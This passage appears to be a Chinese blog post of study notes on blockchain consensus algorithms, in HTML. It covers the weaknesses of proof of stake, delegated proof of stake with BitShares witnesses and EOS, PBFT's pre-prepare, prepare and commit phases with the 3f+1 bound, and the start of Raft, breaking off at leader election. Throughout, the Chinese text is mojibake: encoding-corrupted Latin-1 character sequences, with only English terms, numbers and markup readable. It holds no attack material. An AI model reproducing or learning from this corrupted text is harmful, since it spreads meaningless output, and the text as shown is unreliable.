æˆæœ¬åˆ©ç›Šé—®é¢˜ï¼Œåœ¨PoSç³»ç»Ÿä¸­åšä»»ä½•äº‹å‡ ä¹æ²¡æœ‰æˆæœ¬ï¼Œæ¯”å¦‚åœ¨PoSç³»ç»Ÿä¸ŠæŒ–çŸ¿å‡ ä¹æ²¡æœ‰æˆæœ¬ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€åˆ†å‰éå¸¸æ–¹ä¾¿ã€‚</p><p>3ï¼‰æç«¯çš„æƒ…å†µä¸‹ä¼šå¸¦æ¥ä¸­å¿ƒåŒ–çš„ç»“æœã€‚PoS æœºåˆ¶ç”±è‚¡ä¸œè‡ªå·±ä¿è¯å®‰å…¨ï¼Œå·¥ä½œåŸç†æ˜¯åˆ©ç›Šæ†ç»‘ã€‚åœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œä¸æŒæœ‰ PoS çš„äººæ— æ³•å¯¹ PoS æ„æˆå¨èƒã€‚PoS çš„å®‰å…¨å–å†³äºæŒæœ‰è€…ï¼Œå’Œå…¶ä»–ä»»ä½•å› ç´ æ— å…³ã€‚åœ¨POSæœºåˆ¶é‡Œï¼Œæ‹¥æœ‰å¸å’Œå¸é¾„è¶Šé«˜çš„èŠ‚ç‚¹æ‹¥æœ‰ç€è¶Šé«˜äº§ç”Ÿæ–°åŒºå—çš„æƒåŠ›ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä½ æ‹¥æœ‰è¶Šå¤šçš„å¸ï¼Œå¹¶ä¸”ä½ æ‹¥æœ‰çš„å¸çš„å¸é¾„è¶Šä¹…ï¼Œå°±æœ‰å¯èƒ½è·å¾—è®°è´¦æƒçš„æ¦‚ç‡è¶Šå¤§ã€‚POSè™½ç„¶è§£å†³äº†POWçš„èƒ½è€—çš„é—®é¢˜ï¼Œä½†å…¨èŠ‚ç‚¹ç¡®è®¤ä¼šè®©åŒºå—ç¡®è®¤çš„æ•ˆç‡æä¸èµ·æ¥ï¼Œä¸”æ—¶é—´è¶Šé•¿ï¼Œä¹Ÿè¶Šå®¹æ˜“äº§ç”Ÿé©¬å¤ªæ•ˆåº”ï¼Œå³æŒæœ‰å¸è¶Šå¤šçš„äººä¼šè·å¾—æ›´å¤šçš„å¸å¥–åŠ±ï¼Œä»è€ŒåŠ å¤§è´«å¯Œå·®è·ï¼Œæœ€ç»ˆäº§ç”Ÿè¶…è¿‡50%çš„ä¸­å¿ƒåŒ–èŠ‚ç‚¹ï¼Œè¢«åŠ¨æ¼”åŒ–ä¸ºéé¢„æœŸçš„ä¸­å¿ƒåŒ–çš„ç»“æœã€‚</p><p>4ï¼‰å¸é¾„å…¶å®å°±æ˜¯æ—¶é—´ï¼Œä¸€æ—¦æŒ–çŸ¿è€…å›¤ç§¯ä¸€å®šçš„å¸ï¼Œå¾ˆä¹…å¾ˆä¹…ä¹‹åå‘èµ·æ”»å‡»ï¼Œè¿™æ ·å°†å¾ˆå®¹æ˜“æ‹¿åˆ°è®°è´¦æƒã€‚å¹¶ä¸”ï¼ŒçŸ¿å·¥å¯ä»¥å›¤ç§¯ä»£å¸ä»è€Œå¯¼è‡´è´§å¸æµé€šå›°éš¾ã€‚</p><h2 id="DPOS"><a href="#DPOS" class="headerlink" title="DPOS"></a>DPOS</h2><p><strong>å¸¦ä¸­å¿ƒåŒ–æ€è·¯çš„å…±è¯†æœºåˆ¶</strong></p><p><strong>äººæ°‘ä»£è¡¨å¤§ä¼šåˆ¶åº¦</strong></p><h3 id="ä»‹ç»-2"><a href="#ä»‹ç»-2" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å§”ä»»æƒç›Šè¯æ˜ï¼ˆDPOSï¼ŒDelegated Proof-of-Stakeï¼‰</p><p>DPoSç®—æ³•æ˜¯æ ¹æ®å½“æ—¶PoWã€PoSçš„ä¸è¶³è€Œæ”¹è¿›çš„å…±è¯†ç®—æ³•ï¼Œå®ƒçš„ç›®çš„å°±æ˜¯ä¸ºäº†æé«˜æ€§èƒ½ï¼Œä¹Ÿå°±æ˜¯äº¤æ˜“ç¡®è®¤æ—¶é—´çŸ­ã€‚</p><p>è·ŸPoSä¸åŒçš„æ˜¯ï¼ŒæŒæœ‰å°‘æ•°è‚¡ä»½ï¼ˆæƒç›Šï¼‰çš„èŠ‚ç‚¹ä¹Ÿèƒ½è¡Œä½¿ä»–ä»¬çš„å…±è¯†æƒäº†ï¼Œåªä¸è¿‡æ˜¯ä»¥ä¸€ç§é—´æ¥çš„æ–¹å¼ã€‚ç±»ä¼¼äºè‚¡ä¸œä»£è¡¨å¤§ä¼šï¼Œæ¯å½“è¦å†³ç­–å…¬å¸å¤§äº‹ï¼ˆè®°ä»€ä¹ˆè´¦ï¼Œè°æ¥è®°è´¦ï¼‰çš„æ—¶å€™ï¼Œå…¨ä½“è‚¡æ°‘ï¼ˆèŠ‚ç‚¹ï¼‰ä¾æ³•è¡Œä½¿æŠ•ç¥¨æƒï¼Œé€‰å‡ºè‡ªå·±å¿ƒä¸­çš„è‚¡ä¸œä»£è¡¨ï¼ˆå¯ä¿¡è´¦æˆ·ï¼‰ï¼Œè°å¾—ç¥¨é«˜è°å½“é€‰ã€‚å€™é€‰äººå¯ä»¥å»å…¬å¼€æ¼”è®²æ‹‰ç¥¨ï¼Œè·å¾—è¶³å¤Ÿå¤šè‚¡æ°‘ï¼ˆèŠ‚ç‚¹ï¼‰çš„ä¿¡ä»»ï¼Œç„¶åè‚¡ä¸œä»£è¡¨ï¼ˆè¢«é€‰ä¸­çš„å¯ä¿¡èŠ‚ç‚¹ï¼‰ä»£è¡¨è‚¡æ°‘å†³ç­–å…¬å¸å¤§äº‹ï¼Œè‚¡ä¸œä»£è¡¨çš„äººæ•°ç”±ç³»ç»Ÿå†³å®šï¼Œæ¯”å¦‚Bitsharesä¸º101ä¸ªã€Aschä¸º51ä¸ªï¼ŒEOSä¸º21ä¸ªã€‚</p><p>æ¯”ç‰¹è‚¡ï¼ˆBitshareï¼‰æ˜¯ä¸€ç±»é‡‡ç”¨DPoSæœºåˆ¶çš„å¯†ç è´§å¸ï¼Œå®ƒæœŸæœ›é€šè¿‡å¼•å…¥ä¸€ä¸ªæŠ€æœ¯æ°‘ä¸»å±‚æ¥å‡å°‘ä¸­å¿ƒåŒ–çš„è´Ÿé¢å½±å“ã€‚</p><p>å®ƒçš„åŸç†æ˜¯è®©æ¯ä¸€ä¸ªæŒæœ‰æ¯”ç‰¹è‚¡çš„äººè¿›è¡ŒæŠ•ç¥¨ï¼Œç”±æ­¤äº§ç”Ÿ101ä½ä»£è¡¨ , æˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£ä¸º101ä¸ªè¶…çº§èŠ‚ç‚¹æˆ–è€…çŸ¿æ± ï¼Œè€Œè¿™101ä¸ªè¶…çº§èŠ‚ç‚¹å½¼æ­¤çš„æƒåˆ©æ˜¯å®Œå…¨ç›¸ç­‰çš„ã€‚ä»æŸç§è§’åº¦æ¥çœ‹ï¼ŒDPOSæœ‰ç‚¹åƒæ˜¯è®®ä¼šåˆ¶åº¦æˆ–äººæ°‘ä»£è¡¨å¤§ä¼šåˆ¶åº¦ã€‚å¦‚æœä»£è¡¨ä¸èƒ½å±¥è¡Œä»–ä»¬çš„èŒè´£ï¼ˆå½“è½®åˆ°ä»–ä»¬æ—¶ï¼Œæ²¡èƒ½ç”ŸæˆåŒºå—ï¼‰ï¼Œä»–ä»¬ä¼šè¢«é™¤åï¼Œç½‘ç»œä¼šé€‰å‡ºæ–°çš„è¶…çº§èŠ‚ç‚¹æ¥å–ä»£ä»–ä»¬ã€‚</p><p>æ¯”ç‰¹è‚¡å¼•å…¥äº†è§è¯äººè¿™ä¸ªæ¦‚å¿µï¼Œè§è¯äººå¯ä»¥ç”ŸæˆåŒºå—ï¼Œæ¯ä¸€ä¸ªæŒæœ‰æ¯”ç‰¹è‚¡çš„äººéƒ½å¯ä»¥æŠ•ç¥¨é€‰ä¸¾è§è¯äººã€‚è§è¯äººä¼šå› ä¸ºç”ŸæˆåŒºå—è€Œè·å¾—ä¸€ç¬”æ”¯ä»˜è´¹ç”¨ã€‚è¯¥è´¹ç”¨æ˜¯ç”±æƒç›ŠæŒæœ‰è€…è®¾ç«‹çš„ ã€‚å¾—åˆ°æ€»åŒæ„ç¥¨æ•°ä¸­çš„å‰Nä¸ªï¼ˆNé€šå¸¸å®šä¹‰ä¸º101ï¼‰å€™é€‰è€…å¯ä»¥å½“é€‰ä¸ºè§è¯äººï¼Œ<strong>å½“é€‰è§è¯äººçš„ä¸ªæ•°ï¼ˆNï¼‰éœ€æ»¡è¶³ï¼šè‡³å°‘ä¸€åŠçš„å‚ä¸æŠ•ç¥¨è€…ç›¸ä¿¡Nå·²ç»å……åˆ†åœ°å»ä¸­å¿ƒåŒ–ã€‚</strong>è§è¯äººçš„å€™é€‰åå•æ¯ä¸ªç»´æŠ¤å‘¨æœŸï¼ˆ1å¤©ï¼‰æ›´æ–°ä¸€æ¬¡ã€‚è§è¯äººç„¶åéšæœºæ’åˆ—ï¼Œæ¯ä¸ªè§è¯äººæŒ‰åºæœ‰2ç§’çš„æƒé™æ—¶é—´ç”ŸæˆåŒºå—ï¼Œè‹¥è§è¯äººåœ¨ç»™å®šçš„æ—¶é—´ç‰‡ä¸èƒ½ç”ŸæˆåŒºå—ï¼ŒåŒºå—ç”Ÿæˆæƒé™äº¤ç»™ä¸‹ä¸€ä¸ªæ—¶é—´ç‰‡å¯¹åº”çš„è§è¯äººã€‚DPoSçš„è¿™ç§è®¾è®¡ä½¿å¾—åŒºå—çš„ç”Ÿæˆæ›´ä¸ºå¿«é€Ÿï¼Œä¹Ÿæ›´åŠ èŠ‚èƒ½ã€‚</p><p>DPoSå……åˆ†åˆ©ç”¨äº†æŒè‚¡äººçš„æŠ•ç¥¨ï¼Œä»¥å…¬å¹³æ°‘ä¸»çš„æ–¹å¼è¾¾æˆå…±è¯†ï¼Œä»–ä»¬æŠ•ç¥¨é€‰å‡ºçš„Nä¸ªè§è¯äººï¼Œå¯ä»¥è§†ä¸ºNä¸ªçŸ¿æ± ï¼Œè€Œ<strong>è¿™Nä¸ªçŸ¿æ± å½¼æ­¤çš„æƒåˆ©æ˜¯å®Œå…¨ç›¸ç­‰çš„</strong>ã€‚æŒè‚¡äººå¯ä»¥éšæ—¶é€šè¿‡æŠ•ç¥¨æ›´æ¢è¿™äº›è§è¯äººï¼ˆçŸ¿æ± ï¼‰ï¼Œåªè¦ä»–ä»¬æä¾›çš„ç®—åŠ›ä¸ç¨³å®šï¼Œè®¡ç®—æœºå®•æœºï¼Œæˆ–è€…è¯•å›¾åˆ©ç”¨æ‰‹ä¸­çš„æƒåŠ›ä½œæ¶ã€‚</p><p>åœ¨ DPoS ä¸­ï¼ŒçŸ¿å·¥å¯ä»¥åˆä½œç”Ÿæˆå—ï¼Œè€Œä¸æ˜¯åƒåœ¨ PoW å’Œ PoS ä¸­é‚£æ ·ç«äº‰ç”Ÿæˆã€‚é€šè¿‡åŒºå—ç”Ÿæˆçš„éƒ¨åˆ†ä¸­å¿ƒåŒ–ï¼ŒDPoS çš„è¿è¡Œå¯ä»¥æ¯”å…¶å®ƒå…±è¯†ç®—æ³•å‘ˆæ•°é‡çº§å¿«ã€‚</p><p>æ³¨æ„</p><p>1ï¼‰DPoSæœºåˆ¶ä¸­çš„è‚¡æ°‘ï¼ˆèŠ‚ç‚¹ï¼‰æ ¹æ®è‡ªå·±æŒæœ‰çš„åŠ å¯†è´§å¸æ•°é‡å æ€»é‡çš„ç™¾åˆ†æ¯”ï¼ˆå è‚¡æ¯”ä¾‹ï¼‰æ¥æŠ•ç¥¨ï¼Œä¸æ˜¯ä¸€äººä¸€ç¥¨ï¼› </p><p>2ï¼‰é€‰ä¸¾å‡ºçš„è‚¡ä¸œä»£è¡¨ï¼ˆå¯ä¿¡èŠ‚ç‚¹ï¼‰å®Œå…¨å¯¹ç­‰ï¼Œå¯ç†è§£ä¸ºå…·æœ‰åŒç­‰ç®—åŠ›çš„101ä¸ªçŸ¿æ± ï¼› </p><p>3ï¼‰è‚¡ä¸œä»£è¡¨ä¸€æ—¦æ— èƒ½ã€ä¸ä½œä¸ºã€èƒ¡ä½œä¸ºï¼ˆæä¾›çš„ç®—åŠ›ä¸ç¨³å®šï¼Œè®¡ç®—æœºå®•æœºã€æˆ–è€…è¯•å›¾åˆ©ç”¨æ‰‹ä¸­çš„æƒåŠ›ä½œæ¶ï¼‰ï¼Œå°†ç«‹åˆ»è¢«è‚¡æ°‘è¸¢å‡ºæ•´ä¸ªç³»ç»Ÿï¼Œç„¶åç”±å…¶ä»–åå¤‡ä»£è¡¨é¡¶ä¸Šå»ï¼› </p><p>4ï¼‰å†³ç­–å®Œå…¬å¸å¤§äº‹ï¼ˆè®°å®Œè´¦ã€å‡ºå®Œå—ï¼‰æœ‰é’±åˆ†ï¼Œæ ¹æ®å è‚¡æ¯”ä¾‹ã€‚</p><h3 id="ä¼˜ç¼ºç‚¹-2"><a href="#ä¼˜ç¼ºç‚¹-2" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><p><strong>ä¼˜ç‚¹ï¼š</strong> </p><p>èŠ‚èƒ½ã€å¿«é€Ÿã€é«˜æµé‡åšå®¢ç½‘ç«™Steemitå°±ä½¿ç”¨äº†å®ƒã€‚EOS çš„å—æ—¶é—´æ˜¯ 0.5 ç§’ã€‚ </p><p>1ï¼‰è®°è´¦èŠ‚ç‚¹å‡å°‘ï¼Œäº¤æ˜“é€Ÿåº¦æ›´å¿«ï¼ŒEOSå·ç§°å¯è¾¾ç™¾ä¸‡TPSï¼› </p><p>2ï¼‰æ›´åŠ å®‰å…¨ï¼Œä¸€èˆ¬ä¸ä¸ä¼šå‘ç”Ÿé“¾åˆ†å‰å¹¶ä¸å¯é€†ï¼Œç¡®ä¿æœ€ç»ˆä¸€è‡´æ€§ï¼› </p><p>3ï¼‰ç›¸å¯¹PoWï¼Œè§£å†³äº†èµ„æºæ¶ˆè€—é—®é¢˜ï¼›</p><p><strong>ç¼ºç‚¹ï¼š</strong></p><p>1ï¼‰ç•¥ä¸ºä¸­å¿ƒåŒ–ã€æ‹¥æœ‰é«˜æƒç›Šçš„å‚ä¸è€…å¯æŠ•ç¥¨ä½¿è‡ªå·±æˆä¸ºä¸€åéªŒè¯è€…ã€‚DPoSæœºåˆ¶çš„è®¾è®¡å¹¶ä¸èƒ½ä¿è¯ä¸€å®šæœ‰è¶³é¢çš„çœŸå®çš„åŒºå—ç”Ÿäº§è€…ï¼Œå› ä¸ºä¸€ä¸ªäººæˆ–ä¸€ä¸ªå®ä½“ï¼Œå¯èƒ½æ§åˆ¶ç€å¤šä¸ªèŠ‚ç‚¹ã€‚è¿™æ˜¯è¿‘æœŸå·²åœ¨ EOS ä¸­å‡ºç°çš„é—®é¢˜ã€‚</p><p>2ï¼‰å¯¹äºåèŠ‚ç‚¹çš„å¤„ç†å­˜åœ¨è¯¸å¤šå›°éš¾ã€‚ç¤¾åŒºé€‰ä¸¾ä¸èƒ½åŠæ—¶æœ‰æ•ˆçš„é˜»æ­¢ä¸€äº›ç ´åèŠ‚ç‚¹çš„å‡ºç°ï¼Œç»™ç½‘ç»œé€ æˆå®‰å…¨éšæ‚£ï¼ŒåŒæ—¶åœ¨ç½‘ç»œèŠ‚ç‚¹æ•°é‡å°‘çš„åœºæ™¯ï¼Œé€‰ä¸¾çš„BPä»£è¡¨æ€§ä¸å¼ºã€‚</p><h2 id="PBFT"><a href="#PBFT" class="headerlink" title="PBFT"></a>PBFT</h2><h3 id="ä»‹ç»-3"><a href="#ä»‹ç»-3" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>PBFTæ˜¯Practical Byzantine Fault Toleranceçš„ç¼©å†™ï¼Œæ„ä¸ºå®ç”¨æ‹œå åº­å®¹é”™ç®—æ³•ã€‚è¯¥ç®—æ³•æ˜¯Miguel Castroå’ŒBarbara Liskovåœ¨1999å¹´æå‡ºæ¥çš„ï¼Œè§£å†³äº†åŸå§‹æ‹œå åº­å®¹é”™ç®—æ³•æ•ˆç‡ä¸é«˜çš„é—®é¢˜ï¼Œå°†ç®—æ³•å¤æ‚åº¦ç”±æŒ‡æ•°çº§é™ä½åˆ°å¤šé¡¹å¼çº§ï¼Œä½¿å¾—æ‹œå åº­å®¹é”™ç®—æ³•åœ¨å®é™…ç³»ç»Ÿåº”ç”¨ä¸­å˜å¾—å¯è¡Œã€‚</p><p>PBFTç®—æ³•çš„æ ¸å¿ƒç†è®ºæ˜¯N&gt;=3F+1ï¼Œå…¶ä¸­Næ˜¯æ€»èŠ‚ç‚¹æ•°ï¼ŒFæ˜¯æ•…éšœèŠ‚ç‚¹ï¼ˆæ•…éšœåŒ…æ‹¬å›å¾’æˆ–ä¸å“åº”ï¼‰ã€‚å‡å¦‚æœ‰Fä¸ªæ•…éšœèŠ‚ç‚¹ï¼Œè‡³å°‘æœ‰3F+1ä¸ªèŠ‚ç‚¹æ‰èƒ½ä¿è¯æ•´ä¸ªç³»ç»Ÿæ­£ç¡®è¿è¡Œã€‚</p><p><a href="https://link.zhihu.com/?target=http://pmg.csail.mit.edu/papers/osdi99.pdf">Practical Byzantine Fault Toleranceï¼ˆåŸè®ºæ–‡ï¼‰</a></p><p><a href="https://zhuanlan.zhihu.com/p/35847127">å‚è€ƒ</a></p><p>ç®—æ³•æµç¨‹ï¼š</p><p> PBFTåŸºäºæ‹œå åº­å°†å†›é—®é¢˜ï¼Œä¸€è‡´æ€§çš„ç¡®ä¿ä¸»è¦åˆ†ä¸ºè¿™ä¸‰ä¸ªé˜¶æ®µï¼šé¢„å‡†å¤‡ï¼ˆpre-prepareï¼‰ã€å‡†å¤‡(prepare)å’Œç¡®è®¤(commit)</p><p><img src="/2022/08/06/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220806160119663.png" alt="image-20220806160119663"></p><p> å…¶ä¸­Cä¸ºå‘é€è¯·æ±‚ç«¯ï¼Œ0123ä¸ºæœåŠ¡ç«¯ï¼Œ3ä¸ºå®•æœºçš„æœåŠ¡ç«¯ï¼ˆå³ä½œæ¶èŠ‚ç‚¹ï¼‰ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><p><strong>1.Requestï¼š</strong>è¯·æ±‚ç«¯Cå‘é€è¯·æ±‚åˆ°ä»»æ„ä¸€èŠ‚ç‚¹ï¼Œè¿™é‡Œæ˜¯0 </p><p><strong>2.Pre-Prepareï¼š</strong>æœåŠ¡ç«¯0æ”¶åˆ°Cçš„è¯·æ±‚åè¿›è¡Œå¹¿æ’­ï¼Œæ‰©æ•£è‡³123 </p><p><strong>3.Prepareï¼š</strong>123,æ”¶åˆ°åè®°å½•å¹¶å†æ¬¡å¹¿æ’­ï¼Œ1-&gt;023ï¼Œ2-&gt;013ï¼Œ3å› ä¸ºå®•æœºæ— æ³•å¹¿æ’­ ã€‚åœ¨ä¸€å®šæ—¶é—´èŒƒå›´å†…ï¼Œå¦‚æœæ”¶åˆ°è¶…è¿‡ 2f +1ä¸ªä¸åŒèŠ‚ç‚¹ï¼ˆåŒ…æ‹¬è‡ªå·±ï¼‰çš„ prepare æ¶ˆæ¯ï¼Œå°±ä»£è¡¨ prepare é˜¶æ®µå·²ç»å®Œæˆã€‚</p><p><strong>4.Commitï¼š</strong>0123èŠ‚ç‚¹åœ¨Prepareé˜¶æ®µï¼Œè‹¥æ”¶åˆ°è¶…è¿‡ä¸€å®šæ•°é‡çš„ç›¸åŒè¯·æ±‚ï¼Œåˆ™è¿›å…¥Commité˜¶æ®µï¼Œå¹¿æ’­Commitè¯·æ±‚ï¼› å½“æ”¶åˆ° 2f+1 ä¸ª commit æ¶ˆæ¯åï¼ˆåŒ…æ‹¬è‡ªå·±ï¼‰ï¼Œä»£è¡¨å¤§å¤šæ•°èŠ‚ç‚¹å·²ç»è¿›å…¥ commit é˜¶æ®µï¼Œè¿™ä¸€é˜¶æ®µå·²ç»è¾¾æˆå…±è¯†ï¼Œäºæ˜¯èŠ‚ç‚¹å°±ä¼šæ‰§è¡Œè¯·æ±‚ï¼Œå†™å…¥æ•°æ®ã€‚</p><p><strong>5.Replyï¼š</strong>0123èŠ‚ç‚¹åœ¨Commité˜¶æ®µï¼Œè‹¥æ”¶åˆ°è¶…è¿‡ä¸€å®šæ•°é‡çš„ç›¸åŒè¯·æ±‚ï¼Œåˆ™å¯¹Cè¿›è¡Œåé¦ˆï¼›cæ”¶åˆ°æ¥è‡ª f+1 ä¸ªèŠ‚ç‚¹çš„ç›¸åŒæ¶ˆæ¯åï¼Œä»£è¡¨å…±è¯†å·²ç»æ­£ç¡®å®Œæˆã€‚</p><p><strong>prepareå’Œcommité˜¶æ®µä¸ºä½•éƒ½è¦2f+1ä¸ªèŠ‚ç‚¹åé¦ˆç¡®è®¤?ï¼ˆè¿™2f+1å¹¶ä¸ä¸€å®šæ˜¯ç›¸åŒçš„ï¼‰</strong></p><p>æŸå‰¯æœ¬æ”¶åˆ°f+1ä¸ªç›¸åŒçš„åé¦ˆç¡®è®¤ï¼Œå¦‚æœè¿™f+1ä¸ªåé¦ˆä¸­åŒ…å«faultyèŠ‚ç‚¹å‘è¿‡æ¥çš„æ¶ˆæ¯ï¼Œæ˜¯ï¥§èƒ½ä½œæ•°çš„ï¼Œå› ä¸ºfaultyèŠ‚ç‚¹æ˜¯å¢™å¤´è‰ï¼Œç»™å‰¯æœ¬iå‘é€çš„æ¶ˆæ¯å’Œå‰¯æœ¬jå‘é€çš„æ¶ˆæ¯ä¸ä¸€è‡´(ç±»â½ä¸€ä¸‹ä¸€ä¸ªæ±‰å¥¸è·Ÿæ¸¸å‡»é˜Ÿè¯´â¾ƒå·±æ˜¯çˆ±å›½çš„ï¼Œè·Ÿâ»¤å­è¯´â¾ƒå·±æ˜¯å¿ â¼¼çš„)ã€‚å¿…é¡»è¦2f+1ä¸ªç›¸åŒçš„åé¦ˆç¡®è®¤æ‰èƒ½ä¿è¯f+1ä¸ªnon-faultyèŠ‚ç‚¹æ­£å¸¸ï¼Œè¿™æ—¶å€™å³ä¾¿fä¸ªfaultyèŠ‚ç‚¹ç»™ï¥§åŒâ¼ˆå‘ä¸åŒæ¶ˆæ¯ä¹Ÿæ²¡å…³ç³»ï¼Œf+1ä¸ªnon-faultyèŠ‚ç‚¹å·²ç»å½¢æˆäº†ç»Ÿä¸€æˆ˜çº¿ï¼Œä»–ä»¬åœ¨â¼ˆæ•°ä¸Šå·²ç»å¤šäºé‚£äº›å¢™å¤´è‰ï¦ºï¼Œå¯ä»¥è¾¾æˆâ¼€è‡´äº†ã€‚</p><p>å› æ­¤ï¼Œå¦‚æœé¡ºåˆ©çš„è¯ï¼Œä¸€ä¸ªèŠ‚ç‚¹æ”¶åˆ°1ä¸ªpre-prepareæ¶ˆæ¯å’Œ2fä¸ªå’Œprepareæ¶ˆæ¯è¿›å…¥commité˜¶æ®µï¼Œ2f+1ä¸ªcommitæ¶ˆæ¯åå¯ä»¥replyç»™clientï¼Œclientæ”¶åˆ°f+1ä¸ªå›å¤å°±å¯ä»¥ç¡®è®¤æäº¤æˆåŠŸã€‚</p><p><strong>clientä¸ºä½•åªéœ€è¦f+1ä¸ªç›¸åŒçš„å›å¤å°±å¯ç¡®è®¤ï¼Ÿ</strong></p><p>ä¹‹å‰æˆ‘ä»¬è¯´ï¼Œprepareå’Œcommité˜¶æ®µä¸ºä½•éƒ½è¦2f+1ä¸ªèŠ‚ç‚¹åé¦ˆï¼Œæ‰èƒ½ç¡®è®¤ã€‚clientåªéœ€è¦f+1ä¸ªç›¸åŒçš„replyå°±å¯ä»¥äº†å‘¢ï¼Ÿæˆ‘ä»¬è¿˜æ˜¯æ¥è€ƒè™‘æœ€åçš„æƒ…å†µï¼Œæˆ‘ä»¬å‡è®¾è¿™f+1ä¸ªç›¸åŒçš„replyä¸­ï¼Œæœ‰fä¸ªéƒ½æ˜¯æ¶æ„èŠ‚ç‚¹ã€‚</p><p>æ‰€ä»¥è‡³å°‘æœ‰ä¸€ä¸ªrelyæ˜¯æ­£å¸¸èŠ‚ç‚¹å‘å‡ºæ¥çš„ï¼Œå› ä¸ºåœ¨prepareé˜¶æ®µï¼Œè¿™ä¸ªæ­£å¸¸çš„èŠ‚ç‚¹å·²ç»å¯ä»¥ä¿è¯prepared(m,v,n,i)ä¸ºçœŸï¼Œæ‰€ä»¥å·²ç»èƒ½ä»£è¡¨å¤§å¤šæ•°çš„æ„è§ï¼Œæ‰€ä»¥ï¼Œclientåªéœ€è¦f+1ä¸ªç›¸åŒçš„replyå°±èƒ½ä¿è¯ä»–æ‹¿åˆ°çš„æ˜¯æ•´ä¸ªç³»ç»Ÿå†…â€œå¤§å¤šæ•°æ­£å¸¸èŠ‚ç‚¹â€œçš„æ„è§ï¼Œä»è€Œè¾¾åˆ°ä¸€è‡´æ€§ã€‚</p><h3 id="ä¼˜ç¼ºç‚¹-3"><a href="#ä¼˜ç¼ºç‚¹-3" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><p><strong>ä¼˜ç‚¹ï¼š</strong></p><p>1ï¼‰é€‚ç”¨äºpermissioned systems (è”ç›Ÿé“¾/ç§æœ‰é“¾)ï¼Œèƒ½å®¹çº³æ•…éšœèŠ‚ç‚¹ï¼Œä¹Ÿèƒ½å®¹çº³ä½œæ¶èŠ‚ç‚¹ã€‚è¦æ±‚æ‰€æœ‰èŠ‚ç‚¹æ•°é‡è‡³å°‘ä¸º3f+1ï¼ˆfä¸ºä½œæ¶/æ•…éšœä¸å›åº”èŠ‚ç‚¹çš„æ•°é‡ï¼‰ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯åœ¨å¼‚æ­¥ç³»ç»Ÿä¸­æä¾›å®‰å…¨æ€§å’Œæ´»æ€§ã€‚</p><p>2ï¼‰è§£å†³äº†åŸå§‹æ‹œå åº­å®¹é”™(BFT)ç®—æ³•æ•ˆç‡ä¸é«˜çš„é—®é¢˜ï¼Œå°†ç®—æ³•å¤æ‚åº¦ç”±æŒ‡æ•°çº§é™ä½åˆ°å¤šé¡¹å¼çº§ï¼Œä½¿å¾—æ‹œå åº­å®¹é”™ç®—æ³•åœ¨å®é™…ç³»ç»Ÿåº”ç”¨ä¸­å˜å¾—å¯è¡Œã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong></p><p>1ï¼‰ä»…ä»…é€‚ç”¨äºpermissioned systems (è”ç›Ÿé“¾/ç§æœ‰é“¾)ã€‚</p><p>2ï¼‰é€šä¿¡å¤æ‚åº¦è¿‡é«˜ï¼Œå¯æ‹“å±•æ€§æ¯”è¾ƒä½ï¼Œä¸€èˆ¬çš„ç³»ç»Ÿåœ¨è¾¾åˆ°100å·¦å³çš„èŠ‚ç‚¹ä¸ªæ•°æ—¶ï¼Œæ€§èƒ½ä¸‹é™éå¸¸å¿«ã€‚</p><p>3ï¼‰PBFTåœ¨ç½‘ç»œä¸ç¨³å®šçš„æƒ…å†µä¸‹å»¶è¿Ÿå¾ˆé«˜ã€‚</p><h2 id="RAFT"><a href="#RAFT" class="headerlink" title="RAFT"></a>RAFT</h2><h3 id="ä»‹ç»-4"><a href="#ä»‹ç»-4" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p><a href="https://zhuanlan.zhihu.com/p/125573685">å‚è€ƒ</a></p><p>Raftåè®®æ˜¯ä¸€ç§åˆ†å¸ƒå¼ä¸€è‡´æ€§åè®®ã€‚ä¸€ä¸ªèŠ‚ç‚¹æœ‰3ç§çŠ¶æ€ï¼š</p><ol><li>Follower state.</li><li>Candidate state.</li><li>Leader state.</li></ol><p><img src="/2022/08/06/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220806204455621.png" alt="image-20220806204455621"></p><p> Raftè¦æ±‚ç³»ç»Ÿåœ¨ä»»æ„æ—¶åˆ»æœ€å¤šåªæœ‰ä¸€ä¸ªLeaderï¼Œæ­£å¸¸å·¥ä½œæœŸé—´åªæœ‰Leaderå’ŒFollowersã€‚Raftç®—æ³•å°†æ—¶é—´åˆ†ä¸ºä¸€ä¸ªä¸ªçš„ä»»æœŸï¼ˆtermï¼‰ï¼Œæ¯ä¸€ä¸ªtermçš„å¼€å§‹éƒ½æ˜¯Leaderé€‰ä¸¾ã€‚åœ¨æˆåŠŸé€‰ä¸¾Leaderä¹‹åï¼ŒLeaderä¼šåœ¨æ•´ä¸ªtermå†…ç®¡ç†æ•´ä¸ªé›†ç¾¤ã€‚å¦‚æœLeaderé€‰ä¸¾å¤±è´¥ï¼Œè¯¥termå°±ä¼šå› ä¸ºæ²¡æœ‰Leaderè€Œç»“æŸã€‚</p><p>æ¯ä¸ªèŠ‚ç‚¹ä¸Šéƒ½æœ‰ä¸€ä¸ªå€’è®¡æ—¶å™¨ (Election Timeout)ï¼Œæ—¶é—´éšæœºåœ¨ 150ms åˆ° 300ms ä¹‹é—´ã€‚æœ‰å‡ ç§æƒ…å†µä¼šé‡è®¾ Timeoutï¼š </p><p>ï¼ˆ1ï¼‰æ”¶åˆ°é€‰ä¸¾çš„è¯·æ±‚ </p><p>ï¼ˆ2ï¼‰æ”¶åˆ° Leader çš„ Heartbeat </p><p>åœ¨ Raft è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæœ€ä¸»è¦è¿›è¡Œä¸¤ä¸ªæ´»åŠ¨ï¼š </p><p>ï¼ˆ1ï¼‰é€‰ä¸» Leader Election 